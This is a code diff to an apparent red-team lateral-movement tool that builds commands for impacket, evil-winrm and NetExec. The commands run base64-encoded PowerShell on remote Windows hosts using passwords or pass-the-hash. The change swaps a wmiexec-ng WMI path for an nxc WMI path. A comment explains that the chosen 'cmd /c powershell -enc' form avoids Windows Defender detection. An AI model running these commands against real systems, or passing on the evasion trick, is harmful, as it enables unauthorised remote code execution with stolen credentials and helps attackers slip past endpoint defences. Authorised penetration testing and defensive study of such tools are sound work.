@@ -22,7 +22,7 @@ TOOLS_SPECIFIED = False
 LINUX_MODE = False
 
 VALID_TOOLS = ["winrm", "smbexec", "wmi", "ssh", "mssql", "psexec", "atexec", "rdp"]
-NXC_TOOLS = {"smbexec", "ssh", "rdp"}
+NXC_TOOLS = {"smbexec", "ssh", "wmi", "rdp"}
 
 IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
 NXC_CMD = "nxc"
@@ -210,13 +210,6 @@ def build_cmd(tool, user, target, credential, command, use_hash=False):
         return (f"{cmd} -hashes :{hash_val} \"{user}\"@{target} 'powershell -enc {b64}'"
                 if use_hash else
                 f"{cmd} \"{user}\":{credential}@{target} 'powershell -enc {b64}'")
-    
-    if tool == "wmi":
-        # Use wmiexec-ng for WMI execution (uses HTTPS callback for output retrieval)
-        output_flag = " -o" if OUTPUT else ""
-        return (f"wmiexec-ng {target} -u \"{user}\" -H {hash_val} -x 'powershell -enc {b64}'{output_flag}"
-                if use_hash else
-                f"wmiexec-ng {target} -u \"{user}\" -p {credential} -x 'powershell -enc {b64}'{output_flag}")
 
     # winrm handling - both regular and SSL variants
     # yes I know nxc has a winrm module which can oneshot commands, but evil-winrm has proved itself more dependable
@@ -235,6 +228,13 @@ def build_cmd(tool, user, target, credential, command, use_hash=False):
         return (f"{NXC_CMD} smb {target} -H {hash_val} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
                 if use_hash else
                 f"{NXC_CMD} smb {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
+
+    if tool == "wmi":
+        # we don't actually need to pass the --no-output here, as defender won't catch it with this specific `cmd /c "powershell -enc` combo
+        # additionally, adding --no-output makes it very difficult to differentiate between command execution and a successful authentication w/o execution for wmi specifically
+        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -X 'cmd /c \"powershell -enc {b64}\"'"
+                if use_hash else
+                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -X 'cmd /c \"powershell -enc {b64}\"'")
 
     if tool == "ssh":
         if LINUX_MODE:
